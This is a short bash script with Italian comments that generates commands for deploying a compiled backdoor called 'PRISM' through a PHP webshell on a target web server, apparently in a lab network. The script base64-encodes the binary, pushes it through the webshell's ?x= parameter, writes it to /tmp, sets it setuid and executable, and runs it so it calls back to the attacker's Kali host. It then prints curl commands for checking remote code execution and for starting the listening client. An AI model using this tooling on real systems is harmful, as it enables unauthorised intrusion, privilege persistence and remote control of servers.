#!/bin/bash
# deploy_gen.sh — genera il comando di deploy PRISM via webshell
# Uso: ./deploy_gen.sh <path_prism_compilato> <kali_ip> <webshell_url>
#
# Esempio:
#   ./deploy_gen.sh ./prism 192.168.122.X "https://10.0.2.10/uploads/shell.php"

PRISM_BIN="${1:-./prism}"
KALI_IP="${2:-192.168.122.X}"
SHELL_URL="${3:-https://10.0.2.10/uploads/shell.php}"

if [ ! -f "$PRISM_BIN" ]; then
    echo "[-] File non trovato: $PRISM_BIN"
    exit 1
fi

# Codifica il binario in base64 (una riga)
B64=$(base64 -w0 "$PRISM_BIN")

# Comando da eseguire sul WebServer via webshell
CMD="echo ${B64} | base64 -d > /tmp/kw && chmod u+s /tmp/kw && chmod +x /tmp/kw && /tmp/kw ${KALI_IP} &"

# Codifica il comando per passarlo come parametro ?x=
CMD_B64=$(echo -n "$CMD" | base64 -w0)

echo ""
echo "╔══════════════════════════════════════════════╗"
echo "║  PRISM deploy via webshell                   ║"
echo "╚══════════════════════════════════════════════╝"
echo ""
echo "[1] Carica shell.php sul WebServer tramite upload.php"
echo ""
echo "[2] Verifica RCE (dovrebbe rispondere con 'cm9vdA==' = 'root'):"
echo "    curl -sk '${SHELL_URL}?x=aWQK' | base64 -d"
echo ""
echo "[3] Deploy PRISM (comando lungo — eseguilo su Kali):"
echo ""
echo "    curl -sk --max-time 30 \"${SHELL_URL}?x=${CMD_B64}\" > /dev/null"
echo ""
echo "[4] Avvia prism_client su Kali e aspetta il beacon:"
echo "    sudo ./prism_client"
echo ""
